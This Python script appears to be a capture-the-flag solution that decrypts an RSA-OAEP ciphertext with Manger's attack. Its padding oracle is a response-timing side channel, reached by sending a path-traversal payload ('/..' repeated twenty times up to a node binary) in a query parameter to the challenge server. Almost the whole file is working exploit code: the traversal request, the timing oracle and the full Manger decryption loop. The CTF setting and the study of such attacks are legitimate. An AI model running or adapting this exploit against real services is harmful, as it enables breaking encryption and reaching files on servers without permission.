#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import absolute_import, division, print_function

from builtins import bytes, chr, map, range, zip
import requests
from base64 import *
from binascii import hexlify, unhexlify
from numbers import Number
import math
from hashlib import sha256


def log(data):
    print(data)


def b2i(number_bytes, endian='big'):
    """Unpack bytes into int

    Args:
        number_bytes(bytes)
        endian(string): big/little

    Returns:
        int
    """
    if isinstance(number_bytes, Number):
        return int(number_bytes)

    if endian == 'little':
        number_bytes = number_bytes[::-1]

    return int(hexlify(number_bytes).decode(), 16)


def i2b(number, size=0, endian='big'):
    """Pack int to bytes

    Args:
        number(int)
        size(int): minimum size in bits, 0 if whatever it takes
        endian(string): big/little

    Returns:
        bytes
    """
    if size < 0:
        print("Bad size, must be >= 0")
        return None

    if not isinstance(number, Number):
        return number

    number_bytes = bytes(b'')
    while number:
        number_bytes += bytes([number & 0xff])
        number >>= 8

    number_bytes += bytes(b'\x00'*(int(math.ceil(size/8.0))-len(number_bytes)))

    if endian == 'big':
        return number_bytes[::-1]
    return number_bytes


def oaep_padding_oracle(ciphertext, **kwargs):
    """Function implementing OAEP Padding Oracle

    Args:
        ciphertext(int)
        **kwargs: whatever was passed to manger as **kwargs

    Returns:
        bool: True if decrypted ciphertext has correct padding (starts with 0x00), False otherwise
              in other words: True if plaintext < B, false if plaintext >= B, where B = 2**(key.bitsize-8)
    """
    key_bit_size = kwargs['key_bit_size']
    url = kwargs['url']
    counter = kwargs['counter']

    counter[0] += 1

    traversal = '/usr/local/bin/node'  # in docker eniron
    # traversal = '/usr/bin/node'  # in local environ
    traversal = '/..'*20 + traversal

    payload = i2b(ciphertext, key_bit_size)
    payload = urlsafe_b64encode(payload).replace(b'=', b'')

    resp = requests.get(url+'/ask', params={'oracleName':traversal, 'question':payload})
    time_measure = float(resp.headers['X-Response-Time'].replace('ms','')) / 1000
    time_measure2 = resp.elapsed.total_seconds()
    print("time_measure:", time_measure*1000, time_measure2*1000)

    if time_measure < 0.3:
        return False
    return True


def manger(oaep_padding_oracle, n, e, ciphertext, **kwargs):
    """Given oracle that checks if ciphertext decrypts to some valid plaintext with OAEP padding
    we can decrypt whole ciphertext

    oaep_padding_oracle function must be implemented

    https://iacr.org/archive/crypto2001/21390229.pdf

    Args:
        oaep_padding_oracle(callable)
        n, e(ints): public key
        ciphertext(int)
        kwargs: will be send to oaep_padding_oracle

    Returns:
        plaintext(string)
    """

    def ceil(a, b):
        return a // b + (a % b > 0)

    def floor(a, b):
        return a // b

    log("[i] Decrypting {}".format(ciphertext))

    key_bit_size = kwargs['key_bit_size'] if 'key_bit_size' in kwargs else n.bit_length()
    B = pow(2, key_bit_size - 8)

    # step 1
    log('[+] step 1')
    f1 = 2
    cipheri = (ciphertext * pow(f1, e, n)) % n
    while oaep_padding_oracle(cipheri, **kwargs):
        f1 *= 2
        cipheri = (ciphertext * pow(f1, e, n)) % n

    log('step 1 done')
    log('Found f1: {}'.format(hex(f1)))

    # step 2
    log('step 2')
    f1_half = f1 // 2
    f2 = int(floor(n + B, B)) * f1_half
    cipheri = (ciphertext * pow(f2, e, n)) % n
    while not oaep_padding_oracle(cipheri, **kwargs):
        f2 += f1_half
        cipheri = (ciphertext * pow(f2, e, n)) % n

    log('step 2 done')
    log('Found f2: {}'.format(hex(f2)))

    # step 3
    log('step 3')
    m_min, m_max = ceil(n, f2), floor(n + B, f2)
    while m_min < m_max:
        log(hex(m_max - m_min))
        f_tmp = floor(2 * B, m_max - m_min)
        i = floor(f_tmp * m_min, n)
        f3 = ceil(i * n, m_min)

        cipheri = (ciphertext * pow(f3, e, n)) % n
        if oaep_padding_oracle(cipheri, **kwargs):
            m_max = floor(i * n + B, f3)
        else:
            m_min = ceil(i * n + B, f3)

    log('step 3 done')
    log('m_min = {}'.format(hex(m_min)))
    log('m_max = {}'.format(hex(m_max)))
    plaintext = m_min

    log("plaintext = {}".format(hex(plaintext)))
    return plaintext


def strxor(a, b):
    a = bytes(a)
    b = bytes(b)
    return b''.join([bytes([x^y]) for x,y in zip(a,b)])


def MGF1(mgfSeed, maskLen, the_hash):
    T = b""
    for counter in range(maskLen // the_hash().digest_size + 1):
        c = i2b(counter, size=8*4)
        T = T + the_hash(mgfSeed + c).digest()
    assert(len(T)>=maskLen), '{} {}'.format(len(T), maskLen)
    return T[:maskLen]


def oaep_decode(plaintext, n, label):
    modBits = n.bit_length()
    k = int(math.ceil(modBits / 8.))
    hLen = 256//8

    m = plaintext
    em = b'\x00'*(k-len(m)) + m
    lHash = sha256(label).digest()
    y = em[0]
    maskedSeed = em[1:hLen+1]
    maskedDB = em[hLen+1:]

    seedMask = MGF1(maskedDB, hLen, sha256)
    seed = strxor(maskedSeed, seedMask)
    dbMask = MGF1(seed, k-hLen-1, sha256)
    db = strxor(maskedDB, dbMask)
    valid = 1
    one = db[hLen:].find(b'\x01')
    lHash1 = db[:hLen]
    if lHash1!=lHash:
        valid = 0
    if one<0:
        valid = 0
    if y!=0:
        valid = 0
    if not valid:
        raise ValueError("Incorrect decryption.")
    return db[hLen+one+1:]


def get_flag_enc(url):
    resp = requests.get(url).text

    offset_start_str = '/ask?oracleName=Ithlinne&question='
    offset_start = resp.index(offset_start_str) + len(offset_start_str)
    offset_end = resp.index('">Ask', offset_start)
    resp = str(resp[offset_start:offset_end])

    resp += '='*(4 - len(resp)%4)
    flag_enc = urlsafe_b64decode(resp)
    resp = b2i(flag_enc)
    return resp


if __name__ == "__main__":
    url = 'http://3f7bsgzckp5ezz3qrti6p01q3pfcl0.localhost'

    n = 0xC1889CCE021AFB63B0D0EBE622A4969B36A17150066C856A944324CB2C862DE30448555694C5A88469DC0044680575B8470AE726B58BC2D620D1A95885E881F7F0F0955A2202BB1D0AF9496F89334E14820558D189AA553D970027BB7F6B8D3FE6B21578C029F7D298B9C4AA937E5231A9A0C4776EAD0E03C4D2D1FBD8C2E081
    e = 0x010001

    key_bit_size = 1024
    label = b'Ithlinne Aegli aep Aevenien'

    counter = [0]
    flag_enc = get_flag_enc(url)
    flag_encoded = manger(oaep_padding_oracle, n, e, flag_enc, key_bit_size=key_bit_size, url=url, counter=counter)
    print('flag_encoded = {}'.format(hex(flag_encoded)))
    log('counter = {}'.format(counter[0]))

    # flag_encoded = 0xe8c77ffc5acb5cb0a3d6ba8317c370d5ea71556da82183d868f72eb2729dc9dcac0ac7b3d7a22d533f936aa6f91d8676b9e49075f347b6709de5b3bf1e8a45569774aec547b9a22a8714b553f2cda217718b52357961de9fe95cbf15e53b6e4e5437f1970431e8046473c684601832160096b79eb2a6dad00ae88e57a2a291
    flag = oaep_decode(i2b(flag_encoded, endian='big'), n, label)
    print('flag = "{}"'.format(flag))

